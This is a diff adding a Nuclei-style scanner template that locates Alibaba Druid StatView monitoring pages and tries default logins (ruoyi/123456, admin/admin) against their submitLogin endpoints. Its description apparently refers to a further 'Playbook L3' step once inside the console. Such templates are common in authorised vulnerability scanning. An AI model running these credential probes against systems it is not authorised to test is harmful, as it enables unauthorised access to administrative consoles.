@@ -1,0 +1,66 @@
+id: druid-unauth-surface
+
+info:
+  name: Alibaba Druid StatView Surface
+  author: survey-engine
+  severity: high
+  description: |
+    Druid 监控页指纹 + 常见弱口令（ruoyi/123456、admin/admin）。
+    不连 JDBC、不拖库；进控制台后走 Playbook L3。
+  tags: druid,unauth,weakpass,java,ruoyi
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/druid/login.html"
+      - "{{BaseURL}}/prod-api/druid/login.html"
+      - "{{BaseURL}}/api/druid/login.html"
+      - "{{BaseURL}}/druid/index.html"
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "druid"
+          - "DruidStat"
+          - "StatView"
+          - "login.html"
+        condition: or
+        case-insensitive: true
+        name: druid-page
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/druid/submitLogin"
+      - "{{BaseURL}}/prod-api/druid/submitLogin"
+      - "{{BaseURL}}/api/druid/submitLogin"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    body: "loginUsername=ruoyi&loginPassword=123456"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "success"
+        name: weak-ruoyi
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/druid/submitLogin"
+      - "{{BaseURL}}/prod-api/druid/submitLogin"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    body: "loginUsername=admin&loginPassword=admin"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "success"
+        name: weak-admin
